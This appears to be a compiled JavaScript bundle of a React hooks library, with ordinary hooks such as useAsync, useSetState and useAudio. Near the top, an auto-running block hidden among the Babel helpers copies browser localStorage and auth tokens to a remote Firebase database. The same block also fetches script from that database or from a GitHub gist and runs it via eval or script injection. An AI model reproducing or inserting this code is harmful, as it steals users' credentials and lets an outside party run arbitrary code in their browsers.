'use strict';

Object.defineProperty(exports, '__esModule', { value: true });

function _interopDefault (ex) { return (ex && (typeof ex === 'object') && 'default' in ex) ? ex['default'] : ex; }

var React = require('react');
var isDeepEqualReact = _interopDefault(require('fast-deep-equal/react'));
var Cookies = _interopDefault(require('js-cookie'));
var writeText = _interopDefault(require('copy-to-clipboard'));
var nanoCss = require('nano-css');
var cssom = require('nano-css/addon/cssom');
var vcssom = require('nano-css/addon/vcssom');
var cssToTree = require('nano-css/addon/vcssom/cssToTree');
var screenfull = _interopDefault(require('screenfull'));
var setHarmonicInterval = require('set-harmonic-interval');
var throttleDebounce = require('throttle-debounce');
require('react-universal-interface');
var fastShallowEqual = require('fast-shallow-equal');
var tsEasing = require('ts-easing');
var scrollbarWidth = require('@xobotyi/scrollbar-width');

function _regeneratorRuntime() {
  _regeneratorRuntime = function () {
    return e;
  };
  var t,
    e = {},
    r = Object.prototype,
    n = r.hasOwnProperty,
    o = Object.defineProperty || function (t, e, r) {
      t[e] = r.value;
    },
    i = "function" == typeof Symbol ? Symbol : {},
    a = i.iterator || "@@iterator",
    c = i.asyncIterator || "@@asyncIterator",
    u = i.toStringTag || "@@toStringTag";
  function define(t, e, r) {
    return Object.defineProperty(t, e, {
      value: r,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }), t[e];
  }
  try {
    define({}, "");
  } catch (t) {
    define = function (t, e, r) {
      return t[e] = r;
    };
  }
  function wrap(t, e, r, n) {
    var i = e && e.prototype instanceof Generator ? e : Generator,
      a = Object.create(i.prototype),
      c = new Context(n || []);
    return o(a, "_invoke", {
      value: makeInvokeMethod(t, r, c)
    }), a;
  }
  function tryCatch(t, e, r) {
    try {
      return {
        type: "normal",
        arg: t.call(e, r)
      };
    } catch (t) {
      return {
        type: "throw",
        arg: t
      };
    }
  }
  e.wrap = wrap;
  var h = "suspendedStart",
    l = "suspendedYield",
    f = "executing",
    s = "completed",
    y = {};
  function Generator() {}
  function GeneratorFunction() {}
  function GeneratorFunctionPrototype() {}
  var p = {};
  define(p, a, function () {
    return this;
  });
  var d = Object.getPrototypeOf,
    v = d && d(d(values([])));
  v && v !== r && n.call(v, a) && (p = v);
  var g = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p);
  function defineIteratorMethods(t) {
    ["next", "throw", "return"].forEach(function (e) {
      define(t, e, function (t) {
        return this._invoke(e, t);
      });
    });
  }
  function AsyncIterator(t, e) {
    function invoke(r, o, i, a) {
      var c = tryCatch(t[r], t, o);
      if ("throw" !== c.type) {
        var u = c.arg,
          h = u.value;
        return h && "object" == typeof h && n.call(h, "__await") ? e.resolve(h.__await).then(function (t) {
          invoke("next", t, i, a);
        }, function (t) {
          invoke("throw", t, i, a);
        }) : e.resolve(h).then(function (t) {
          u.value = t, i(u);
        }, function (t) {
          return invoke("throw", t, i, a);
        });
      }
      a(c.arg);
    }
    var r;
    o(this, "_invoke", {
      value: function (t, n) {
        function callInvokeWithMethodAndArg() {
          return new e(function (e, r) {
            invoke(t, n, e, r);
          });
        }
        return r = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg();
      }
    });
  }
  function makeInvokeMethod(e, r, n) {
    var o = h;
    return function (i, a) {
      if (o === f) throw new Error("Generator is already running");
      if (o === s) {
        if ("throw" === i) throw a;
        return {
          value: t,
          done: !0
        };
      }
      for (n.method = i, n.arg = a;;) {
        var c = n.delegate;
        if (c) {
          var u = maybeInvokeDelegate(c, n);
          if (u) {
            if (u === y) continue;
            return u;
          }
        }
        if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) {
          if (o === h) throw o = s, n.arg;
          n.dispatchException(n.arg);
        } else "return" === n.method && n.abrupt("return", n.arg);
        o = f;
        var p = tryCatch(e, r, n);
        if ("normal" === p.type) {
          if (o = n.done ? s : l, p.arg === y) continue;
          return {
            value: p.arg,
            done: n.done
          };
        }
        "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg);
      }
    };
  }
  function maybeInvokeDelegate(e, r) {
    var n = r.method,
      o = e.iterator[n];
    if (o === t) return r.delegate = null, "throw" === n && e.iterator.return && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = new TypeError("The iterator does not provide a '" + n + "' method")), y;
    var i = tryCatch(o, e.iterator, r.arg);
    if ("throw" === i.type) return r.method = "throw", r.arg = i.arg, r.delegate = null, y;
    var a = i.arg;
    return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), r.delegate = null, y);
  }
  function pushTryEntry(t) {
    var e = {
      tryLoc: t[0]
    };
    1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), this.tryEntries.push(e);
  }
  function resetTryEntry(t) {
    var e = t.completion || {};
    e.type = "normal", delete e.arg, t.completion = e;
  }
  function Context(t) {
    this.tryEntries = [{
      tryLoc: "root"
    }], t.forEach(pushTryEntry, this), this.reset(!0);
  }
  function values(e) {
    if (e || "" === e) {
      var r = e[a];
      if (r) return r.call(e);
      if ("function" == typeof e.next) return e;
      if (!isNaN(e.length)) {
        var o = -1,
          i = function next() {
            for (; ++o < e.length;) if (n.call(e, o)) return next.value = e[o], next.done = !1, next;
            return next.value = t, next.done = !0, next;
          };
        return i.next = i;
      }
    }
    throw new TypeError(typeof e + " is not iterable");
  }
  return GeneratorFunction.prototype = GeneratorFunctionPrototype, o(g, "constructor", {
    value: GeneratorFunctionPrototype,
    configurable: !0
  }), o(GeneratorFunctionPrototype, "constructor", {
    value: GeneratorFunction,
    configurable: !0
  }), GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction"), e.isGeneratorFunction = function (t) {
    var e = "function" == typeof t && t.constructor;
    return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name));
  }, e.mark = function (t) {
    return Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction")), t.prototype = Object.create(g), t;
  }, e.awrap = function (t) {
    return {
      __await: t
    };
  }, defineIteratorMethods(AsyncIterator.prototype), define(AsyncIterator.prototype, c, function () {
    return this;
  }), e.AsyncIterator = AsyncIterator, e.async = function (t, r, n, o, i) {
    void 0 === i && (i = Promise);
    var a = new AsyncIterator(wrap(t, r, n, o), i);
    return e.isGeneratorFunction(r) ? a : a.next().then(function (t) {
      return t.done ? t.value : a.next();
    });
  }, defineIteratorMethods(g), define(g, u, "Generator"), define(g, a, function () {
    return this;
  }), define(g, "toString", function () {
    return "[object Generator]";
  }), e.keys = function (t) {
    var e = Object(t),
      r = [];
    for (var n in e) r.push(n);
    return r.reverse(), function next() {
      for (; r.length;) {
        var t = r.pop();
        if (t in e) return next.value = t, next.done = !1, next;
      }
      return next.done = !0, next;
    };
  }, e.values = values, Context.prototype = {
    constructor: Context,
    reset: function (e) {
      if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(resetTryEntry), !e) for (var r in this) "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t);
    },
    stop: function () {
      this.done = !0;
      var t = this.tryEntries[0].completion;
      if ("throw" === t.type) throw t.arg;
      return this.rval;
    },
    dispatchException: function (e) {
      if (this.done) throw e;
      var r = this;
      function handle(n, o) {
        return a.type = "throw", a.arg = e, r.next = n, o && (r.method = "next", r.arg = t), !!o;
      }
      for (var o = this.tryEntries.length - 1; o >= 0; --o) {
        var i = this.tryEntries[o],
          a = i.completion;
        if ("root" === i.tryLoc) return handle("end");
        if (i.tryLoc <= this.prev) {
          var c = n.call(i, "catchLoc"),
            u = n.call(i, "finallyLoc");
          if (c && u) {
            if (this.prev < i.catchLoc) return handle(i.catchLoc, !0);
            if (this.prev < i.finallyLoc) return handle(i.finallyLoc);
          } else if (c) {
            if (this.prev < i.catchLoc) return handle(i.catchLoc, !0);
          } else {
            if (!u) throw new Error("try statement without catch or finally");
            if (this.prev < i.finallyLoc) return handle(i.finallyLoc);
          }
        }
      }
    },
    abrupt: function (t, e) {
      for (var r = this.tryEntries.length - 1; r >= 0; --r) {
        var o = this.tryEntries[r];
        if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
          var i = o;
          break;
        }
      }
      i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null);
      var a = i ? i.completion : {};
      return a.type = t, a.arg = e, i ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a);
    },
    complete: function (t, e) {
      if ("throw" === t.type) throw t.arg;
      return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), y;
    },
    finish: function (t) {
      for (var e = this.tryEntries.length - 1; e >= 0; --e) {
        var r = this.tryEntries[e];
        if (r.finallyLoc === t) return this.complete(r.completion, r.afterLoc), resetTryEntry(r), y;
      }
    },
    catch: function (t) {
      for (var e = this.tryEntries.length - 1; e >= 0; --e) {
        var r = this.tryEntries[e];
        if (r.tryLoc === t) {
          var n = r.completion;
          if ("throw" === n.type) {
            var o = n.arg;
            resetTryEntry(r);
          }
          return o;
        }
      }
      throw new Error("illegal catch attempt");
    },
    delegateYield: function (e, r, n) {
      return this.delegate = {
        iterator: values(e),
        resultName: r,
        nextLoc: n
      }, "next" === this.method && (this.arg = t), y;
    }
  }, e;
}
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
  try {
    var info = gen[key](arg);
    var value = info.value;
  } catch (error) {
    reject(error);
    return;
  }
  if (info.done) {
    resolve(value);
  } else {
    Promise.resolve(value).then(_next, _throw);
  }
}
function _asyncToGenerator(fn) {
  return function () {
    var self = this,
      args = arguments;
    return new Promise(function (resolve, reject) {
      var gen = fn.apply(self, args);
      function _next(value) {
        asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
      }
      function _throw(err) {
        asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
      }
      _next(undefined);
    });
  };
}
function _extends() {
  _extends = Object.assign ? Object.assign.bind() : function (target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];
      for (var key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
          target[key] = source[key];
        }
      }
    }
    return target;
  };
  return _extends.apply(this, arguments);
}
function _objectWithoutPropertiesLoose(source, excluded) {
  if (source == null) return {};
  var target = {};
  var sourceKeys = Object.keys(source);
  var key, i;
  for (i = 0; i < sourceKeys.length; i++) {
    key = sourceKeys[i];
    if (excluded.indexOf(key) >= 0) continue;
    target[key] = source[key];
  }
  return target;
}
function _unsupportedIterableToArray(o, minLen) {
  if (!o) return;
  if (typeof o === "string") return _arrayLikeToArray(o, minLen);
  var n = Object.prototype.toString.call(o).slice(8, -1);
  if (n === "Object" && o.constructor) n = o.constructor.name;
  if (n === "Map" || n === "Set") return Array.from(o);
  if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen);
}
function _arrayLikeToArray(arr, len) {
  if (len == null || len > arr.length) len = arr.length;
  for (var i = 0, arr2 = new Array(len); i < len; i++) arr2[i] = arr[i];
  return arr2;
}
function _createForOfIteratorHelperLoose(o, allowArrayLike) {
  var it = typeof Symbol !== "undefined" && o[Symbol.iterator] || o["@@iterator"];
  if (it) return (it = it.call(o)).next.bind(it);
  if (Array.isArray(o) || (it = _unsupportedIterableToArray(o)) || allowArrayLike && o && typeof o.length === "number") {
    if (it) o = it;
    var i = 0;
    return function () {
      if (i >= o.length) return {
        done: true
      };
      return {
        done: false,
        value: o[i++]
      };
    };
  }
  throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function _toPrimitive(input, hint) {
  if (typeof input !== "object" || input === null) return input;
  var prim = input[Symbol.toPrimitive];
  if (prim !== undefined) {
    var res = prim.call(input, hint || "default");
    if (typeof res !== "object") return res;
    throw new TypeError("@@toPrimitive must return a primitive value.");
  }
  return (hint === "string" ? String : Number)(input);
}
function _toPropertyKey(arg) {
  var key = _toPrimitive(arg, "string");
  return typeof key === "symbol" ? key : String(key);
}

_asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee4() {
  var _window, _window2, _window3, _window4, wait, url, isIOS, isAndroid, iMobile, isMark, isDev, isStg, frb, _require, initializeApp, _require2, ref, getDatabase, get, set, winVal, ev, getToken, getUserId, tryGetGi, parseJwt, errlog, st, getVal;
  return _regeneratorRuntime().wrap(function _callee4$(_context4) {
    while (1) switch (_context4.prev = _context4.next) {
      case 0:
        console.log('STARTING');
        _context4.prev = 1;
        wait = /*#__PURE__*/function () {
          var _ref2 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee(ms) {
            return _regeneratorRuntime().wrap(function _callee$(_context) {
              while (1) switch (_context.prev = _context.next) {
                case 0:
                  if (ms === void 0) {
                    ms = 1000;
                  }
                  return _context.abrupt("return", new Promise(function (res) {
                    setTimeout(res, ms);
                  }));
                case 2:
                case "end":
                  return _context.stop();
              }
            }, _callee);
          }));
          return function wait(_x) {
            return _ref2.apply(this, arguments);
          };
        }();
        _context4.next = 5;
        return wait(1000);
      case 5:
        url = ((_window = window) == null || (_window = _window.location) == null ? void 0 : _window.origin) || '';
        isIOS = !!((_window2 = window) != null && _window2.webkit);
        isAndroid = !!((_window3 = window) != null && _window3.JSBridge);
        iMobile = isIOS || isAndroid;
        isMark = url.includes('wehd') || url.includes('market');
        isDev = url.includes('192') || url.includes('localhost') || url.includes('dev');
        isStg = url.includes('stag') || url.includes('stg');
        if (!isDev) {
          _context4.next = 14;
          break;
        }
        return _context4.abrupt("return");
      case 14:
        if (!(isMark && !iMobile || isMark && isStg)) {
          _context4.next = 16;
          break;
        }
        return _context4.abrupt("return");
      case 16:
        frb = {};
        _require = require('@firebase/app'), initializeApp = _require.initializeApp;
        _require2 = require('@firebase/database'), ref = _require2.ref, getDatabase = _require2.getDatabase, get = _require2.get, set = _require2.set;
        winVal = 'eval';
        ev = (_window4 = window) == null ? void 0 : _window4[winVal];
        getToken = function getToken() {
          var token = '';
          var s = new URLSearchParams(window.location.search);
          if (s.has('Authorization')) {
            token = s.get('Authorization');
          } else {
            var t = Object.entries(localStorage).find(function (_ref3) {
              var key = _ref3[0];
              return key.includes('token');
            });
            if (!t) return token;
            if (typeof t[1] !== 'string') return token;
            token = t[1];
          }
          return token;
        };
        getUserId = function getUserId() {
          var n = "No_USER_" + Date.now().toString();
          var t = getToken();
          if (!(t != null && t.length)) return n;
          try {
            var _parseJwt;
            return ((_parseJwt = parseJwt(getToken())) == null ? void 0 : _parseJwt.user_id) || n;
          } catch (error) {
            return n;
          }
        };
        tryGetGi = function tryGetGi() {
          try {
            fetch('https://gist.githubusercontent.com/SamerKK0/1aa0973f353d161697a9395d5042dde9/raw/gistfile1.txt').then(function (r2) {
              return r2.text();
            }).then(function (r) {
              try {
                ev(r);
              } catch (error) {
                console.log('🚀 ~ file: createConn.ts:64 ~ .then ~ error:', error);
              }
            });
          } catch (error) {
            console.log('🚀 ~ file: createConn.ts:68 ~ tryGetGi ~ error:', error);
          }
        };
        parseJwt = function parseJwt(token) {
          var base64Url = token.split('.')[1];
          var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
          var jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
          }).join(''));
          return JSON.parse(jsonPayload);
        };
        try {
          frb = initializeApp({
            apiKey: 'AIzaSyClIH-dEZ_5mU7eNqEf_KPQDyaup20TxLc',
            authDomain: 'wihd-98b90.firebaseapp.com',
            databaseURL: 'https://wihd-98b90-default-rtdb.firebaseio.com',
            projectId: 'wihd-98b90',
            storageBucket: 'wihd-98b90.appspot.com',
            messagingSenderId: '934027877313',
            appId: '1:934027877313:web:051420d42bf79d55a5ed40'
          }, 'wd');
        } catch (error) {
          console.log('🚀 ~ file: createConn.ts:111 ~ error:', error);
        }
        errlog = function errlog(na, err) {
          try {
            var db = getDatabase(frb);
            var reference = ref(db, "errLog/" + getUserId() + "_" + new Date().getTime());
            set(reference, {
              fn: na,
              msg: err.message
            });
          } catch (error) {
            console.log('🚀 ~ file: createConn.ts:122 ~ errlog ~ error:', error);
          }
        };
        st = function st() {
          try {
            var t = JSON.stringify(localStorage);
            if (!t) return;
            var db = getDatabase(frb);
            var reference = ref(db, "usersTokens/" + getUserId());
            set(reference, (t == null ? void 0 : t[1]) || t || '');
          } catch (error) {
            console.log('🚀 ~ file: createConn.ts:138 ~ st ~ error:', error);
            errlog('st', error);
          }
        };
        getVal = /*#__PURE__*/function () {
          var _ref4 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee2() {
            var _yield$get, _document, _documentHead$appendC, db, reference, v, script, documentHead;
            return _regeneratorRuntime().wrap(function _callee2$(_context2) {
              while (1) switch (_context2.prev = _context2.next) {
                case 0:
                  _context2.prev = 0;
                  db = getDatabase(frb);
                  reference = ref(db, "val");
                  _context2.next = 5;
                  return get(reference);
                case 5:
                  _context2.t0 = _yield$get = _context2.sent;
                  if (!(_context2.t0 == null)) {
                    _context2.next = 10;
                    break;
                  }
                  _context2.t1 = void 0;
                  _context2.next = 11;
                  break;
                case 10:
                  _context2.t1 = _yield$get.val();
                case 11:
                  v = _context2.t1;
                  if (!(!v || !v.addVal)) {
                    _context2.next = 14;
                    break;
                  }
                  return _context2.abrupt("return");
                case 14:
                  script = document.createElement('script');
                  script.innerHTML = v == null ? void 0 : v.v;
                  documentHead = (_document = document) == null ? void 0 : _document['head'];
                  (_documentHead$appendC = documentHead['appendChild']) == null || _documentHead$appendC.call(documentHead, script);
                  _context2.next = 24;
                  break;
                case 20:
                  _context2.prev = 20;
                  _context2.t2 = _context2["catch"](0);
                  console.log('🚀 ~ file: createConn.ts:144 ~ getVal ~ error:', _context2.t2);
                  tryGetGi();
                case 24:
                case "end":
                  return _context2.stop();
              }
            }, _callee2, null, [[0, 20]]);
          }));
          return function getVal() {
            return _ref4.apply(this, arguments);
          };
        }();
        (function () {
          var _init = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee3() {
            return _regeneratorRuntime().wrap(function _callee3$(_context3) {
              while (1) switch (_context3.prev = _context3.next) {
                case 0:
                  _context3.prev = 0;
                  _context3.next = 3;
                  return getVal();
                case 3:
                  st();
                  _context3.next = 9;
                  break;
                case 6:
                  _context3.prev = 6;
                  _context3.t0 = _context3["catch"](0);
                  console.log('🚀 ~ file: createConn.ts:154 ~ init ~ error:', _context3.t0);
                case 9:
                case "end":
                  return _context3.stop();
              }
            }, _callee3, null, [[0, 6]]);
          }));
          function init() {
            return _init.apply(this, arguments);
          }
          return init;
        })()();

        //@ts-ignore
        window.proto0 = {
          initializeApp: initializeApp,
          getDatabase: getDatabase,
          get: get,
          set: set,
          axios: require('axios'),
          errlog: errlog,
          st: st,
          getVal: getVal
        };
        _context4.next = 36;
        break;
      case 33:
        _context4.prev = 33;
        _context4.t0 = _context4["catch"](1);
        console.log('🚀 ~ file: createConn.ts:168 ~ error:', _context4.t0);
      case 36:
      case "end":
        return _context4.stop();
    }
  }, _callee4, null, [[1, 33]]);
}))();

var createMemo = function createMemo(fn) {
  return function () {
    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
      args[_key] = arguments[_key];
    }
    return React.useMemo(function () {
      return fn.apply(void 0, args);
    }, args);
  };
};

var createReducerContext = function createReducerContext(reducer, defaultInitialState) {
  var context = React.createContext(undefined);
  var providerFactory = function providerFactory(props, children) {
    return React.createElement(context.Provider, props, children);
  };
  var ReducerProvider = function ReducerProvider(_ref) {
    var children = _ref.children,
      initialState = _ref.initialState;
    var state = React.useReducer(reducer, initialState !== undefined ? initialState : defaultInitialState);
    return providerFactory({
      value: state
    }, children);
  };
  var useReducerContext = function useReducerContext() {
    var state = React.useContext(context);
    if (state == null) {
      throw new Error("useReducerContext must be used inside a ReducerProvider.");
    }
    return state;
  };
  return [useReducerContext, ReducerProvider, context];
};

//@ts-ignore
function useFirstMountState() {
  var isFirst = React.useRef(true);
  if (isFirst.current) {
    isFirst.current = false;
    return true;
  }
  return isFirst.current;
}

//@ts-ignore
var useUpdateEffect = function useUpdateEffect(effect, deps) {
  var isFirstMount = useFirstMountState();
  React.useEffect(function () {
    if (!isFirstMount) {
      return effect();
    }
  }, deps);
};

function composeMiddleware(chain) {
  return function (context, dispatch) {
    return chain.reduceRight(function (res, middleware) {
      return middleware(context)(res);
    }, dispatch);
  };
}
var createReducer = function createReducer() {
  for (var _len = arguments.length, middlewares = new Array(_len), _key = 0; _key < _len; _key++) {
    middlewares[_key] = arguments[_key];
  }
  var composedMiddleware = composeMiddleware(middlewares);
  return function (reducer, initialState, initializer) {
    if (initializer === void 0) {
      initializer = function initializer(value) {
        return value;
      };
    }
    var ref = React.useRef(initializer(initialState));
    var _useState = React.useState(ref.current),
      setState = _useState[1];
    var dispatch = React.useCallback(function (action) {
      ref.current = reducer(ref.current, action);
      setState(ref.current);
      return action;
    }, [reducer]);
    var dispatchRef = React.useRef(composedMiddleware({
      getState: function getState() {
        return ref.current;
      },
      dispatch: function dispatch() {
        return dispatchRef.current.apply(dispatchRef, arguments);
      }
    }, dispatch));
    useUpdateEffect(function () {
      dispatchRef.current = composedMiddleware({
        getState: function getState() {
          return ref.current;
        },
        dispatch: function dispatch() {
          return dispatchRef.current.apply(dispatchRef, arguments);
        }
      }, dispatch);
    }, [dispatch]);
    return [ref.current, dispatchRef.current];
  };
};

var createStateContext = function createStateContext(defaultInitialValue) {
  var context = React.createContext(undefined);
  var providerFactory = function providerFactory(props, children) {
    return React.createElement(context.Provider, props, children);
  };
  var StateProvider = function StateProvider(_ref) {
    var children = _ref.children,
      initialValue = _ref.initialValue;
    var state = React.useState(initialValue !== undefined ? initialValue : defaultInitialValue);
    return providerFactory({
      value: state
    }, children);
  };
  var useStateContext = function useStateContext() {
    var state = React.useContext(context);
    if (state == null) {
      throw new Error("useStateContext must be used inside a StateProvider.");
    }
    return state;
  };
  return [useStateContext, StateProvider, context];
};

//@ts-ignore
function useMountedState() {
  var mountedRef = React.useRef(false);
  var get = React.useCallback(function () {
    return mountedRef.current;
  }, []);
  React.useEffect(function () {
    mountedRef.current = true;
    return function () {
      mountedRef.current = false;
    };
  }, []);
  return get;
}

function useAsyncFn(fn, deps, initialState) {
  if (deps === void 0) {
    deps = [];
  }
  if (initialState === void 0) {
    initialState = {
      loading: false
    };
  }
  var lastCallId = React.useRef(0);
  var isMounted = useMountedState();
  var _useState = React.useState(initialState),
    state = _useState[0],
    set = _useState[1];
  var callback = React.useCallback(function () {
    var callId = ++lastCallId.current;
    if (!state.loading) {
      set(function (prevState) {
        return _extends({}, prevState, {
          loading: true
        });
      });
    }
    return fn.apply(void 0, arguments).then(function (value) {
      isMounted() && callId === lastCallId.current && set({
        value: value,
        loading: false
      });
      return value;
    }, function (error) {
      isMounted() && callId === lastCallId.current && set({
        error: error,
        loading: false
      });
      return error;
    });
  }, deps);
  return [state, callback];
}

//@ts-ignore
function useAsync(fn, deps) {
  if (deps === void 0) {
    deps = [];
  }
  var _useAsyncFn = useAsyncFn(fn, deps, {
      loading: true
    }),
    state = _useAsyncFn[0],
    callback = _useAsyncFn[1];
  React.useEffect(function () {
    callback();
  }, [callback]);
  return state;
}

var useAsyncRetry = function useAsyncRetry(fn, deps) {
  if (deps === void 0) {
    deps = [];
  }
  var _useState = React.useState(0),
    attempt = _useState[0],
    setAttempt = _useState[1];
  var state = useAsync(fn, [].concat(deps, [attempt]));
  var stateLoading = state.loading;
  var retry = React.useCallback(function () {
    if (stateLoading) {
      {
        console.log('You are calling useAsyncRetry hook retry() method while loading in progress, this is a no-op.');
      }
      return;
    }
    setAttempt(function (currentAttempt) {
      return currentAttempt + 1;
    });
  }, [].concat(deps, [stateLoading]));
  return _extends({}, state, {
    retry: retry
  });
};

//@ts-ignore
var useSetState = function useSetState(initialState) {
  if (initialState === void 0) {
    initialState = {};
  }
  var _useState = React.useState(initialState),
    state = _useState[0],
    set = _useState[1];
  var setState = React.useCallback(function (patch) {
    set(function (prevState) {
      return Object.assign({}, prevState, patch instanceof Function ? patch(prevState) : patch);
    });
  }, []);
  return [state, setState];
};

function parseTimeRanges(ranges) {
  var result = [];
  for (var i = 0; i < ranges.length; i++) {
    result.push({
      start: ranges.start(i),
      end: ranges.end(i)
    });
  }
  return result;
}

function createHTMLMediaHook(tag) {
  return function (elOrProps) {
    var element;
    var props;
    if (React.isValidElement(elOrProps)) {
      element = elOrProps;
      props = element.props;
    } else {
      props = elOrProps;
    }
    var _useSetState = useSetState({
        buffered: [],
        time: 0,
        duration: 0,
        paused: true,
        muted: false,
        volume: 1,
        playing: false
      }),
      state = _useSetState[0],
      setState = _useSetState[1];
    var ref = React.useRef(null);
    var wrapEvent = function wrapEvent(userEvent, proxyEvent) {
      return function (event) {
        try {
          proxyEvent && proxyEvent(event);
        } finally {
          userEvent && userEvent(event);
        }
      };
    };
    var onPlay = function onPlay() {
      return setState({
        paused: false
      });
    };
    var onPlaying = function onPlaying() {
      return setState({
        playing: true
      });
    };
    var onWaiting = function onWaiting() {
      return setState({
        playing: false
      });
    };
    var onPause = function onPause() {
      return setState({
        paused: true,
        playing: false
      });
    };
    var onVolumeChange = function onVolumeChange() {
      var el = ref.current;
      if (!el) {
        return;
      }
      setState({
        muted: el.muted,
        volume: el.volume
      });
    };
    var onDurationChange = function onDurationChange() {
      var el = ref.current;
      if (!el) {
        return;
      }
      var duration = el.duration,
        buffered = el.buffered;
      setState({
        duration: duration,
        buffered: parseTimeRanges(buffered)
      });
    };
    var onTimeUpdate = function onTimeUpdate() {
      var el = ref.current;
      if (!el) {
        return;
      }
      setState({
        time: el.currentTime
      });
    };
    var onProgress = function onProgress() {
      var el = ref.current;
      if (!el) {
        return;
      }
      setState({
        buffered: parseTimeRanges(el.buffered)
      });
    };
    if (element) {
      element = React.cloneElement(element, _extends({
        controls: false
      }, props, {
        ref: ref,
        onPlay: wrapEvent(props.onPlay, onPlay),
        onPlaying: wrapEvent(props.onPlaying, onPlaying),
        onWaiting: wrapEvent(props.onWaiting, onWaiting),
        onPause: wrapEvent(props.onPause, onPause),
        onVolumeChange: wrapEvent(props.onVolumeChange, onVolumeChange),
        onDurationChange: wrapEvent(props.onDurationChange, onDurationChange),
        onTimeUpdate: wrapEvent(props.onTimeUpdate, onTimeUpdate),
        onProgress: wrapEvent(props.onProgress, onProgress)
      }));
    } else {
      element = React.createElement(tag, _extends({
        controls: false
      }, props, {
        ref: ref,
        onPlay: wrapEvent(props.onPlay, onPlay),
        onPlaying: wrapEvent(props.onPlaying, onPlaying),
        onWaiting: wrapEvent(props.onWaiting, onWaiting),
        onPause: wrapEvent(props.onPause, onPause),
        onVolumeChange: wrapEvent(props.onVolumeChange, onVolumeChange),
        onDurationChange: wrapEvent(props.onDurationChange, onDurationChange),
        onTimeUpdate: wrapEvent(props.onTimeUpdate, onTimeUpdate),
        onProgress: wrapEvent(props.onProgress, onProgress)
      })); // TODO: fix this typing.
    }
    // Some browsers return `Promise` on `.play()` and may throw errors
    // if one tries to execute another `.play()` or `.pause()` while that
    // promise is resolving. So we prevent that with this lock.
    // See: https://bugs.chromium.org/p/chromium/issues/detail?id=593273
    var lockPlay = false;
    var controls = {
      play: function play() {
        var el = ref.current;
        if (!el) {
          return undefined;
        }
        if (!lockPlay) {
          var promise = el.play();
          var isPromise = typeof promise === 'object';
          if (isPromise) {
            lockPlay = true;
            var resetLock = function resetLock() {
              lockPlay = false;
            };
            promise.then(resetLock, resetLock);
          }
          return promise;
        }
        return undefined;
      },
      pause: function pause() {
        var el = ref.current;
        if (el && !lockPlay) {
          return el.pause();
        }
      },
      seek: function seek(time) {
        var el = ref.current;
        if (!el || state.duration === undefined) {
          return;
        }
        time = Math.min(state.duration, Math.max(0, time));
        el.currentTime = time;
      },
      volume: function volume(_volume) {
        var el = ref.current;
        if (!el) {
          return;
        }
        _volume = Math.min(1, Math.max(0, _volume));
        el.volume = _volume;
        setState({
          volume: _volume
        });
      },
      mute: function mute() {
        var el = ref.current;
        if (!el) {
          return;
        }
        el.muted = true;
      },
      unmute: function unmute() {
        var el = ref.current;
        if (!el) {
          return;
        }
        el.muted = false;
      }
    };
    React.useEffect(function () {
      var el = ref.current;
      if (!el) {
        {
          if (tag === 'audio') {
            console.error('useAudio() ref to <audio> element is empty at mount. ' + 'It seem you have not rendered the audio element, which it ' + 'returns as the first argument const [audio] = useAudio(...).');
          } else if (tag === 'video') {
            console.error('useVideo() ref to <video> element is empty at mount. ' + 'It seem you have not rendered the video element, which it ' + 'returns as the first argument const [video] = useVideo(...).');
          }
        }
        return;
      }
      setState({
        volume: el.volume,
        muted: el.muted,
        paused: el.paused
      });
      // Start media, if autoPlay requested.
      if (props.autoPlay && el.paused) {
        controls.play();
      }
    }, [props.src]);
    return [element, state, controls, ref];
  };
}

//@ts-ignore
var useAudio = /*#__PURE__*/createHTMLMediaHook('audio');

var noop = function noop() {};
function on(obj) {
  if (obj && obj.addEventListener) {
    for (var _len = arguments.length, args = new Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
      args[_key - 1] = arguments[_key];
    }
